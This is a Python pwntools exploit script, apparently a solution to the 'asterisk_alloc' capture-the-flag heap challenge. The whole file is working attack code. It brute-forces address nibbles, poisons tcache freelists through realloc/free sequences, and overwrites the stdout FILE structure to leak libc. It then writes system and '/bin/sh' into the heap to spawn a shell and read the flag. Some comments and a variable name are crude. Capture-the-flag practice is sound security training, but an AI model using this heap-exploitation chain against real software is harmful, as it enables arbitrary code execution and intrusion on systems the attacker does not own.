```python
from pwn import *
import random

while True:
    try:

        #r = process("./asterisk_alloc", env={"LD_PRELOAD":"./libcheap.so.6"})
        #r = process("./asterisk_alloc")
        r = remote("ast-alloc.chal.ctf.westerns.tokyo", 10001)

        r.recvuntil(":")

        def reset1():
          r.sendline("1")
          #r.recvuntil(":")
          r.sendline("0")
          r.recvuntil("ta:")

        def malloc(size, data):
          r.sendline("1")
          #r.recvuntil(":")
          r.sendline(str(size))
          r.recvuntil("ta:")
          r.send(data)
          r.recvuntil(":")

        def calloc(size, data):
          r.sendline("2")
          #r.recvuntil(":")
          r.sendline(str(size))
          r.recvuntil("ta:")
          r.send(data)
          r.recvuntil(":")

        def realloc(size, data):
          r.sendline("3")
          #r.recvuntil(":")
          r.sendline(str(size))
          r.recvuntil("ta:")
          if size > 0:
            r.send(data)
            r.recvuntil("choice:")
          else:
            r.recvuntil("choice:")

        def free(kind): #m, c, r
          r.sendline("4")
          #r.recvuntil(":")
          r.sendline(kind)
          r.recvuntil("h:")


        realloc(0x1000, "A")

        """

        pid = r.pid
        print pid
        maps = open("/proc/{}/maps".format(pid), "r").read()
        #print maps

        heapbase = 0x0
        libcbase = -1
        for i in maps.split("\n"):
          if "heap" in i and heapbase == 0:
            heapbase = int(i.split("-")[0], 16)
          if "libc" in i and libcbase == -1:
            libcbase = int(i.split("-")[0], 16)

        print hex(libcbase)
        print hex(heapbase)
        realnibble = (heapbase >> 12) & 0xf
        realnibble <<= 4
        print hex(realnibble)
        realnibble2 = ((libcbase+0x3ec760) >> 12) & 0xf
        realnibble2 <<= 4
        print hex(realnibble2)
        nibble = realnibble
        nibble2 = realnibble2
        """
        #nibble = 0xf0
        #nibble = 0xe0
        #nibble2 = 0x70
        nibble = random.randint(0, 15)*0x10
        nibble2 = random.randint(0, 15)*0x10
        print hex(nibble)
        print hex(nibble2)


        calloc(0x20, "C")
        realloc(0x320, "B")
        for i in range(8):
          free("r")
        realloc(0x40, "C")
        realloc(0, "A")
        realloc(0x50, "D")
        free("r")
        realloc(0, "A")

        realloc(0x330, "C")
        for i in range(8):
          free("r")
        realloc(0x60, "E")
        realloc(0, "A")
        realloc(0x70, "F")
        free("r")
        realloc(0, "A")
        realloc(0x320, "A"*0x40 + p64(0x0) + p64(0xc1) + "\xb0" + chr(nibble | 4)) # fuck heap pointer
        realloc(0, "A")
        realloc(0x330, "A"*0x60 + p64(0x0) + p64(0xd1) + "\xf0" + chr(nibble | 5)) # fuck heap pointer
        realloc(0, "B")

        realloc(0xa8, "A") # fake libc poitners
        realloc(0xb8, "E"*(0xb0-0x10) + p64(0x0) + p64(0x21) + "\x60" + chr(nibble2 | 7)) # fake libc poitners
        realloc(0x88, "E") # fake libc poitners
        realloc(0x128, "F")
        realloc(0x138, p64(0x0) + p64(0x21) + "E"*(0x130-0x10-0x10) + p64(0x0) + p64(0x21) + "\x20") # fake libc poitners
        realloc(0, "A")


        # putting libc on head of freelist
        realloc(0x50, "L")
        realloc(0, "A")
        realloc(0x70, "L")
        realloc(0, "A")

        print "PROGESS"

        realloc(0x50, "L")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(str(0x50))
        r.recvuntil(":")
        r.send(p64(0xfbad1800) + p64(0x0)*3 + "\x00")
        r.recvuntil("\x00", timeout=2)
        dick = r.recv(50)
        print dick.encode("hex")
        leak = u64(dick[7:][:8])
        print hex(leak)
        if leak == 0x3d3d3d3d3d3d3d3d:
            r.close()
            continue

        realloc(0, "A")
        realloc(0x70, "A")
        realloc(0, "A")
        libcbase = leak - 0x3ed8b0
        binsh = libcbase + 0x1b3e9a
        onegad = libcbase + 0x10a38c
        system = libcbase + 0x4f440
        realloc(0x70, "/bin/sh\x00" + p64(system))

        r.sendline("3")
        r.recvuntil(":")
        r.sendline("1")

        r.sendline("ls; cat flag*")

        r.interactive()
        exit()
    except Exception as e:
        print e
        r.close()
```
